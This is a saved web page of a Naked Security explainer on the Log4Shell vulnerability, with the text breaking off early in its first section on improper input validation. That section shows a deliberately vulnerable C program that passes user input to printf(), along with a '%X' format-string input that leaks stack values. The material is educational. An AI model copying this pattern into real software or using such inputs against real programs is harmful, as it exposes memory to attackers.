<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-site-verification" content="RHQeasQqjasbRt5asY6atZYbs5tr10gFBevDt2HRhW0" />
<link rel="pingback" href="https://nakedsecurity.sophos.com/xmlrpc.php">
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5VK6LTK');</script>
<!-- End Google Tag Manager -->

<meta name="description" content="Find out how to deal with the Log4Shell vulnerability right across your estate. Yes, you need to patch, but that helps everyone else along with you!" />
<meta name="keywords" content="vulnerability, cve-2021-44228, log4j, log4shell" />
<title>Log4Shell explained &#8211; how it works, why you need to know, and how to fix it &#8211; Naked Security</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="I9dHFo-YhnK2MfAHn-20V4GnWrOttVUYyISGamyU41M" />
<meta name="msvalidate.01" content="7D8D1FA2892142B1543D2CBCD07FB88F" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Naked Security &raquo; Feed" href="https://nakedsecurity.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Naked Security &raquo; Comments Feed" href="https://nakedsecurity.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Naked Security &raquo; Log4Shell explained &#8211; how it works, why you need to know, and how to fix it Comments Feed" href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/feed/" />
<link rel='stylesheet' id='all-css-0' href='https://nakedsecurity.sophos.com/_static/??-eJyVkEEOgzAMBD/UJNACEoeqbzHBgrROiGIjxO8bqh5AvdDjencse80SlQuW5h7ZWGbTOxbT0WRfilyXIK2GZSXU3gWdAxezJ55sPPYOkNBjkIOIBCsmRTiAXc/h2dvrA2SnIFtGxuyx4SmOEwdcWF2Lsv4e+U9YEQiynGW2cqDXMiYEUeOcw0mDjz+8n1WkeXAh/4cSITdZFrr6LPgONubh72Vza+uyaNrqDT9Ej1w=' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type="text/javascript" src="https://nakedsecurity.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZsaWpoYGZpUkWAK+HIiQ=" ></script><link rel="https://api.w.org/" href="https://nakedsecurity.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://nakedsecurity.sophos.com/wp-json/wp/v2/posts/647469" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://nakedsecurity.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://nakedsecurity.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.8.2" />
<link rel="canonical" href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/" />
<link rel='shortlink' href='https://nakedsecurity.sophos.com/?p=647469' />
<link rel="alternate" type="application/json+oembed" href="https://nakedsecurity.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnakedsecurity.sophos.com%2F2021%2F12%2F13%2Flog4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://nakedsecurity.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnakedsecurity.sophos.com%2F2021%2F12%2F13%2Flog4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style>
		<link rel="amphtml" href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Log4Shell explained &#8211; how it works, why you need to know, and how to fix it" />
<meta property="og:url" content="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/" />
<meta property="og:description" content="Find out how to deal with the Log4Shell vulnerability right across your estate. Yes, you need to patch, but that helps everyone else along with you!" />
<meta property="article:published_time" content="2021-12-13T19:41:01+00:00" />
<meta property="article:modified_time" content="2021-12-14T21:47:53+00:00" />
<meta property="og:site_name" content="Naked Security" />
<meta property="og:image" content="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?w=775" />
<meta property="og:image:secure_url" content="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?w=775" />
<meta property="og:image:width" content="775" />
<meta property="og:image:height" content="405" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:creator" content="@NakedSecurity" />
<meta name="twitter:site" content="@NakedSecurity" />
<meta name="twitter:text:title" content="Log4Shell explained &#8211; how it works, why you need to know, and how to fix it" />
<meta name="twitter:image" content="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2020/03/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2020/03/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2020/03/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2020/03/cropped-sophos.png?w=270" />
</head>
<body class="post-template-default single single-post postid-647469 single-format-standard" >
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5VK6LTK"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div style="display: none">
<svg>
	<symbol id="sophos" viewBox="0 0 132 24">
		<path d="m111.82 22.176h11.64c3.267 0 4.65-0.2 5.74-0.896 1.715-1.063 2.804-3.26 2.804-5.62 0-1.928-0.658-3.89-1.647-4.888-1.288-1.33-3.035-1.828-6.271-1.828h-3.527c-1.586 0-2.754-0.067-3.412-0.365-0.794-0.367-1.256-1.165-1.256-2.161 0-1.165 0.56-2.03 1.486-2.264 0.692-0.163 1.498-0.163 3.574-0.198h10.419v-3.956h-11.473c-2.574 0-3.727 0.099-4.718 0.466-2.279 0.796-3.828 3.257-3.828 6.083 0 1.93 0.76 3.727 2.079 4.89 1.155 0.996 2.872 1.462 5.51 1.462h4.697c1.057 0 1.915 0.132 2.376 0.398 0.893 0.433 1.418 1.328 1.418 2.36 0 0.864-0.395 1.597-1.087 2.027-0.561 0.369-1.517 0.534-3.268 0.534h-11.256zm-111.35 0h11.64c3.267 0 4.652-0.2 5.741-0.896 1.714-1.063 2.803-3.26 2.803-5.62 0-1.928-0.66-3.89-1.65-4.888-1.285-1.33-3.034-1.828-6.27-1.828h-3.527c-1.584 0-2.751-0.067-3.41-0.365-0.792-0.367-1.253-1.165-1.253-2.161 0-1.165 0.56-2.03 1.484-2.264 0.693-0.163 1.496-0.163 3.574-0.198h10.42v-3.956h-11.477c-2.573 0-3.727 0.099-4.715 0.466-2.278 0.796-3.83 3.257-3.83 6.083 0 1.93 0.762 3.727 2.08 4.89 1.155 0.996 2.871 1.462 5.51 1.462h4.696c1.057 0 1.913 0.132 2.377 0.398 0.888 0.433 1.416 1.328 1.416 2.36 0 0.864-0.394 1.597-1.089 2.027-0.558 0.369-1.517 0.534-3.264 0.534h-11.256v3.956zm94.05-16.18c-0.68 1.076-1.003 2.803-1.003 5.122 0 5.088 1.747 7.405 5.63 7.405 3.822 0 5.568-2.317 5.568-7.34 0-5.092-1.715-7.373-5.568-7.373-2.102 0-3.754 0.784-4.627 2.186zm13.174-2.511c1.329 1.761 2.072 4.63 2.072 7.992 0 3.816-1.197 6.948-3.334 8.677-1.619 1.304-4.078 2.022-6.995 2.022-4.142 0-7.41-1.372-9.092-3.817-1.263-1.793-1.88-4.176-1.88-7.08 0-4.172 1.133-7.339 3.27-9.035 1.682-1.37 4.339-2.122 7.383-2.122 3.85 0 6.925 1.209 8.576 3.363zm-22.018-3.068h-4.596v8.908h-8.319v-8.908h-4.597v21.759h4.597v-8.97h8.318v8.97h4.596v-21.759zm-28.61 10.277c1.23 0 1.941-0.163 2.427-0.62 0.581-0.49 0.938-1.533 0.938-2.74 0-1.436-0.58-2.478-1.584-2.838-0.356-0.13-0.94-0.197-1.684-0.197h-6.344v6.395zm-6.247 11.481h-4.598v-21.758h10.78c3.786 0 5.114 0.39 6.538 1.991 1.264 1.37 1.942 3.163 1.942 5.088 0 2.284-0.904 4.404-2.394 5.676-1.262 1.077-2.43 1.402-4.888 1.402h-7.38zm-22.589-16.179c-0.682 1.076-1.004 2.803-1.004 5.122 0 5.088 1.748 7.405 5.634 7.405 3.818 0 5.568-2.317 5.568-7.34 0-5.092-1.716-7.373-5.568-7.373-2.106 0-3.757 0.784-4.63 2.186zm13.174-2.511c1.328 1.761 2.073 4.63 2.073 7.992 0 3.816-1.2 6.948-3.335 8.677-1.618 1.304-4.079 2.022-6.993 2.022-4.144 0-7.413-1.372-9.096-3.817-1.264-1.793-1.878-4.176-1.878-7.08 0-4.172 1.133-7.339 3.272-9.035 1.681-1.37 4.337-2.122 7.38-2.122 3.851 0 6.93 1.209 8.578 3.363z"></path>
	</symbol>
	<symbol id="twitter" viewBox="0 0 24 24">
 		<path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path>
 	</symbol>
	<symbol id="facebook" viewBox="0 0 24 24">
 		<path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path>
 	</symbol>
	<symbol id="instagram" viewBox="0 0 24 24">
		<path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"></path>
	</symbol>
	<symbol id="linkedin" viewBox="0 0 24 24">
		<path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"></path>
	</symbol>
	<symbol id="rss" viewBox="0 0 24 24">
		<path d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"></path>
	</symbol>
	<symbol id="reddit" viewBox="0 0 24 24">
		<path d="M24 11.779c0-1.459-1.192-2.645-2.657-2.645-.715 0-1.363.286-1.84.746-1.81-1.191-4.259-1.949-6.971-2.046l1.483-4.669 4.016.941-.006.058c0 1.193.975 2.163 2.174 2.163 1.198 0 2.172-.97 2.172-2.163s-.975-2.164-2.172-2.164c-.92 0-1.704.574-2.021 1.379l-4.329-1.015c-.189-.046-.381.063-.44.249l-1.654 5.207c-2.838.034-5.409.798-7.3 2.025-.474-.438-1.103-.712-1.799-.712-1.465 0-2.656 1.187-2.656 2.646 0 .97.533 1.811 1.317 2.271-.052.282-.086.567-.086.857 0 3.911 4.808 7.093 10.719 7.093s10.72-3.182 10.72-7.093c0-.274-.029-.544-.075-.81.832-.447 1.405-1.312 1.405-2.318zm-17.224 1.816c0-.868.71-1.575 1.582-1.575.872 0 1.581.707 1.581 1.575s-.709 1.574-1.581 1.574-1.582-.706-1.582-1.574zm9.061 4.669c-.797.793-2.048 1.179-3.824 1.179l-.013-.003-.013.003c-1.777 0-3.028-.386-3.824-1.179-.145-.144-.145-.379 0-.523.145-.145.381-.145.526 0 .65.647 1.729.961 3.298.961l.013.003.013-.003c1.569 0 2.648-.315 3.298-.962.145-.145.381-.144.526 0 .145.145.145.379 0 .524zm-.189-3.095c-.872 0-1.581-.706-1.581-1.574 0-.868.709-1.575 1.581-1.575s1.581.707 1.581 1.575-.709 1.574-1.581 1.574z"></path>
	</symbol>
</svg>
</div>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	
	<header id="masthead" class="site-header variation variation-3" role="banner">
		<div class="header-container">
			<div class="site-branding">
				<div class="site-title">
					<a title="Naked Security" href="https://nakedsecurity.sophos.com/" rel="home"><img src="https://nakedsecurity.sophos.com/wp-content/themes/sophosnews-2015/img/naked-security-logo-white@2x.png"></a>
					by
					<a title="sophos.com" href="https://www.sophos.com"><svg viewBox="0 0 132 24" class="icon sophos"><use xlink:href="#sophos"></use></svg></a>
				</div>
			</div><!-- .site-branding -->
			<nav id="site-navigation" class="main-navigation" role="navigation">
				<div class="container">
					<ul id="menu-variation-two" class="exit-links menu"><li id="menu-item-436509" class="products menu-item menu-item-type-custom menu-item-object-custom menu-item-436509"><a href="#">Products</a></li>
<li id="menu-item-436515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-436515"><a href="https://www.sophos.com/en-us/products/free-tools.aspx">Free Tools</a></li>
<li id="menu-item-436531" class="search-toggle menu-item menu-item-type-custom menu-item-object-custom menu-item-436531"><a href="#">Search</a></li>
<li id="menu-item-436532" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-436532"><a href="https://home.sophos.com/en-us.aspx">Free Sophos Home</a></li>
</ul>				</div>
			</nav><!-- #site-navigation -->
			<div class="site-search-block">
	<form target="_top" role="search" class="search-form" method="get" action="https://nakedsecurity.sophos.com/">
        <fieldset>
            <div class="field">
				<input type="search" value="" name="s" class="search-field" placeholder="Search naked security...">
            </div>
            <div class="submit">
				<button type="submit" class="search-submit button">Go</button>
            </div>
        </fieldset>
    </form>
</div>
		</div><!-- .container -->
	</header>

	<div class="responsive-flyout-panel small-12 column active" style="opacity: 1; display: none;">
		<div class="modal-filler"></div>
	    <div class="productNavBox">
	        <div class="productNavContainer">
	            <div class="row prodRow">
	                <div class="prodListBox column large-9">
	                    <div class="row margin-0 highlightProduct">
	                        <div class="column medium-6">
	                            <a href="https://www.sophos.com/products/next-gen-firewall.aspx"><img src="https://www.sophos.com/medialibrary/2F4785DE8C3F43ECBD699A18F332FEEB.ashx">
	                                <div class="menu-section-header">
										<div class="menu-section-title">XG Firewall</div>
	                                	<div class="menu-section-subtitle">Next-Gen Firewall</div>
									</div>
	                            </a>
	                        </div>
	                        <div class="column medium-6">
	                            <a href="https://www.sophos.com/products/intercept-x.aspx"><img src="https://www.sophos.com/medialibrary/27111765D65A45D49A232925D2CE428B.ashx">
	                                <div class="menu-section-header">
										<div class="menu-section-title">Intercept X</div>
	                                	<div class="menu-section-subtitle">Next-Gen Endpoint</div>
									</div>
	                            </a>
	                        </div>
	                    </div>
	                    <div class="productList">
	                        <ul>
								<li>
									<a href="https://www.sophos.com/en-us/products/cloud-optix.aspx"><img src="https://www.sophos.com/medialibrary/SophosNext/Images/Products/Icons/sophos-cloud-optix-icon.svg">Sophos Cloud Optix</a>
								</li>
	                            <li>
	                                <a href="https://www.sophos.com/products/sophos-central.aspx"><img src="https://www.sophos.com/medialibrary/08EA66123F1B4DDE8FE5C9B578A7FAA7.ashx">Sophos Central</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/mobile-control.aspx"><img src="https://www.sophos.com/medialibrary/678FE994855047739F50D6C411184FA6.ashx">Sophos Mobile</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/server-security.aspx"><img src="https://www.sophos.com/medialibrary/01B80E7D7CD54EF8AC2E51C9C6EC0236.ashx">Intercept X for Server</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/secure-wifi.aspx"><img src="https://www.sophos.com/medialibrary/BEBD9C41BB4E480498514B29B92A145A.ashx">Secure Wi-Fi</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/phish-threat.aspx"><img src="https://www.sophos.com/medialibrary/DC9D1A7BA3964B0C9DAF1F1E68806B5A.ashx">Phish Threat</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/safeguard-encryption.aspx"><img src="https://www.sophos.com/medialibrary/8F51F06B62814B108D3B2763FF018E37.ashx">SafeGuard Encryption</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/sophos-email.aspx"><img src="https://www.sophos.com/medialibrary/597ADA0AF01A4A12B2B27239D0F9992C.ashx">Secure Email</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/unified-threat-management.aspx"><img src="https://www.sophos.com/medialibrary/8CB72BF5E1AD41F7894CE5E42101B0F3.ashx">SG UTM</a>
	                            </li>
	                            <li>
	                                <a href="https://www.sophos.com/products/secure-web-gateway.aspx"><img src="https://www.sophos.com/medialibrary/C586E372694547A1B207A61D87246BA7.ashx">Secure Web Gateway</a>
	                            </li>
	                        </ul>
	                    </div>
	                </div>
	                <div class="homeUserBox column large-3">
						<img src="https://www.sophos.com/medialibrary/3376DF5742A64AEE93FDB9DCA7291239.ashx">
						<div class="menu-section-title">For Home Users</div>
	                    <p>Sophos Home protects every Mac and PC in your home </p><a href="https://home.sophos.com/" target="_blank" class="greenSmallMenuBtn">Learn More</a>
					</div>
	            </div>
	            <div class="row blueRow">
	                <div class="column large-3 medium-6">
	                    <a href="https://www.sophos.com/products/free-tools.aspx"><img width="19" src="https://www.sophos.com/medialibrary/A1FF440D2BB84511B8C94D771D44E207.ashx">Free Security Tools</a>
	                </div>
	                <div class="column large-3 medium-6">
	                    <a href="https://www.sophos.com/products/free-trials.aspx"><img width="20" src="https://www.sophos.com/medialibrary/FCD3410ED2C347808D9DB8AC12C62DBD.ashx">Free Trials</a>
	                </div>
	                <div class="column large-3 medium-6">
	                    <a href="https://www.sophos.com/products/demos.aspx"><img width="18" src="https://www.sophos.com/medialibrary/50985180E5F54C94917A2A6508E24287.ashx">Product Demos</a>
	                </div>
	                <!-- <div class="column large-3 medium-6">
	                    <a href="javascript:fairfax.openLiveChatFromFlyoutLink();" class="flyout-live-chat-link"><img width="20" src="https://www.sophos.com/medialibrary/E24C5050837145F6A5C592E299BA2A0D.ashx">Live Sales Chat</a>
	                </div> -->
	            </div>
	        </div>
	    </div>
	</div>
	<script>

	jQuery(document).ready( function () {
		var productButton   = jQuery('nav .menu-item.products');
		var modalBackground = jQuery('.modal-filler');
		var flyoutMenu		= jQuery('.responsive-flyout-panel');
		var Sophos			= Sophos || {};

		Sophos.MenuTest = {};

		Sophos.MenuTest.open = function () {
				productButton.addClass('open');
				flyoutMenu.show();
				modalBackground.show();
		};

		Sophos.MenuTest.close = function () {
			productButton.removeClass('open');
			flyoutMenu.hide();
			modalBackground.hide();
		};

		Sophos.MenuTest.toggle = function () {
			if ( productButton.hasClass('open') ) {
				Sophos.MenuTest.close();
			} else {
				Sophos.MenuTest.open();
			}
		};

		productButton.click( Sophos.MenuTest.toggle );
		modalBackground.click( Sophos.MenuTest.close );
	});

	</script>

	
	<section class="about-panel">
	<div class="container">
	<div class="panel-content ">

		<div class="description"><span>Have you listened to our podcast? <a href="/podcast/">Listen now</a></span></div>

	</div> <!-- .panel-container -->
	</div> <!-- .container -->
	</section> <!-- .panel -->

	
	<div id="content" class="site-content">
		<div class="content-container">

</div> <!-- .container -->
</div> <!-- #content -->


	<section class="content-panel">
	<div class="container">
	<div class="panel-content framed-content-area">

		<main id="main" class="site-main" role="main">

	
		
<article id="post-647469" class="post-647469 post type-post status-publish format-standard has-post-thumbnail hentry category-featured category-vulnerability tag-cve-2021-44228 tag-log4j tag-log4shell">

	<header class="entry-header">
		<h1 class="entry-title">Log4Shell explained &#8211; how it works, why you need to know, and how to fix it</h1>		<div class="entry-meta">
			<div>
				
	<span class="entry-published">
		<time class="entry-date published" datetime="2021-12-13T19:41:01+00:00">13 Dec 2021</time>
	</span>

					<a href="#comments" class="comment-box">
					<span class="count">34</span>
				</a>
					
	<span class="entry-categories">
	<a href="https://nakedsecurity.sophos.com/category/security-threats/vulnerability/">Vulnerability</a>	</span>

			</div>
	</header> <!-- .entry-header -->

    <div id="newsletter-signup" class="container top"></div>

			<div class="entry-featured-image">
			<img width="780" height="408" src="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?w=780&amp;h=408&amp;crop=1" class="attachment-hero-thumbnail size-hero-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg 1200w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?resize=300,157 300w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?resize=768,401 768w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?resize=1024,535 1024w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?resize=780,408 780w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/shell-1220.jpg?resize=100,52 100w" sizes="(max-width: 780px) 100vw, 780px" />					</div> <!-- .entry-featured-image -->
		
		<nav class="navigation post-navigation" role="navigation">
		<h2 class="screen-reader-text">Post navigation</h2>

		<div class="nav-links">
			<div class="nav-previous"><a href="https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/" rel="prev"><span class="nav-label">Previous</span><span class="nav-seperator">:</span><span class="nav-title"> &#8220;Log4Shell&#8221; Java vulnerability &#8211; how to safeguard your servers</span></a></div><div class="nav-next"><a href="https://nakedsecurity.sophos.com/2021/12/14/apple-security-updates-are-out-and-not-a-log4shell-mention-in-sight/" rel="next"><span class="nav-label">Next</span><span class="nav-seperator">:</span><span class="nav-title"> Apple security updates are out &#8211; and not a Log4Shell mention in sight</span></a></div>		</div>
		<!-- .nav-links -->
	</nav><!-- .navigation -->
	
	<div class="entry-content">
		<div class="entry-prefix">
			<div class="entry-author">
				
	
					<span class="by">by</span>
			<a href="https://nakedsecurity.sophos.com/author/paul-ducklin/" title="Posts by Paul Ducklin" class="author url fn" rel="author">Paul Ducklin</a>		
	
				</div>
			<div class="entry-sharing">
				
	<ul class="block social share">
		<li class="facebook"><a href="https://www.facebook.com/share.php?u=https%3A%2F%2Fnakedsecurity.sophos.com%2F2021%2F12%2F13%2Flog4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it%2F&title=Log4Shell+explained+%E2%80%93+how+it+works%2C+why+you+need+to+know%2C+and+how+to+fix+it" data-title="Log4Shell explained – how it works, why you need to know, and how to fix it" title="Share on Facebook"><svg style="height: 20px;" viewBox="0 0 100 100" class="icon facebook"><use xlink:href="#facebook"></use></svg></a></li>
		<li class="twitter"><a href="https://twitter.com/intent/tweet?text=Log4Shell+explained+%E2%80%93+how+it+works%2C+why+you+need+to+know%2C+and+how+to+fix+it+https%3A%2F%2Fnakedsecurity.sophos.com%2F%3Fp%3D647469" data-title="Log4Shell explained &#8211; how it works, why you need to know, and how to fix it" title="Share on Twitter"><svg style="height: 20px;" viewBox="0 0 100 100" class="icon twitter"><use xlink:href="#twitter"></use></svg></a></li>
		<li class="linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fnakedsecurity.sophos.com%2F2021%2F12%2F13%2Flog4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it%2F&title=Log4Shell+explained+%E2%80%93+how+it+works%2C+why+you+need+to+know%2C+and+how+to+fix+it" data-title="Log4Shell explained – how it works, why you need to know, and how to fix it" title="Share on LinkedIn"><svg style="height: 20px;"  viewBox="0 0 100 100" class="icon linkedin"><use xlink:href="#linkedin"></use></svg></a></li>
		<li class="reddit"><a href="https://reddit.com/submit/?url=https%3A%2F%2Fnakedsecurity.sophos.com%2F2021%2F12%2F13%2Flog4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it%2F&title=Log4Shell+explained+%E2%80%93+how+it+works%2C+why+you+need+to+know%2C+and+how+to+fix+it" title="Share on Reddit"><svg style="height: 20px;"  viewBox="0 0 100 100" class="icon reddit"><use xlink:href="#reddit"></use></svg></a></li>

			</ul>

				</div>
		</div>
		<p>In this article, we explain the <a href="https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/">Apache Log4Shell vulnerability</a> in plain English, and give you some simple educational code that you can use safely and easily at home (or even directly on your own servers) in order to learn more.</p>
<p>Just to be clear up front: we&#8217;re not going to show you how to build a working exploit, or how set up the services you need in the cloud to deliver active payloads.</p>
<p>Instead, you will learn:</p>
<ul>
<li>How vulnerabilities like this end up in software.
<li>How the Log4Shell vulnerability works.
<li>The various ways it can be abused.
<li>How to use Apache&#8217;s suggested mitigations.
<li>How to test your mitigations for effectiveness.
<li>Where to go from here.
</ul>
<h2>1. Improper input validation</h2>
<p>The primary cause of Log4Shell, formally known as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" rel="nofollow"><strong>CVE-2021-44228</strong></a>, is what NIST calls <em>improper input validation</em>.</p>
<p>Loosely speaking, this means that you place too much trust in untrusted data that arrives from outsiders, and open up your software to sneaky tricks based on booby-trapped data.</p>
<p>If you&#8217;ve ever programmed in C, you&#8217;ll almost certainly have bumped into this sort of problem when using the <code>printf()</code> function (<em>format string and print</em>).</p>
<p>Normally, you use it something like this:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
  int  printf(const char *format, ...);

  int  count; 
  char *name;

  /* print them out somewhat safely */

  print(&quot;The name %.20s appeared %d times\n&quot;,name,count);
</pre>
<p>You provide a hard-coded format string as the first argument, where <code>%.20s</code> means &#8220;print the next argument as a text string, but give up after 20 bytes just in case&#8221;, and <code>%d</code> means &#8220;take an integer and print it in decimal&#8221;.</p>
<p>It&#8217;s tempting also to use <code>printf()</code> when you want to print just a single string, like this, and you often see people making this mistake in code, especially if it&#8217;s written in a hurry:</p>
<pre class="brush: cpp; title: ; notranslate" title="">
   int  printf(const char *format, ...);

   /* printfhack.c */

   int main(int argc, char **argv) {
      /* print out first command-line argument */
      printf(argv[1]);    &lt;-- use puts() or similar instead
      return 0;
   }
</pre>
<p>In this code, the user gets not only to choose the string to be printed out, but also to control the very formatting string that decides what to print.</p>
<p>So if you ask this program to print <code>hello</code>, it will do exactly that, but if you ask it to print <code>%X %X %X %X %X</code> then you won&#8217;t see those characters in the output, because <code>%X</code> is actually a magic &#8220;format code&#8221; that tells <code>printf()</code> how to behave.</p>
<p>The special text <code>%X</code> means &#8220;get the next value off the program stack and print out its raw value in hexadecimal&#8221;.</p>
<p>So a malcontented user who can trick your little program into printing an apparently harmless string of <code>%X</code>s will actually see something like this:</p>
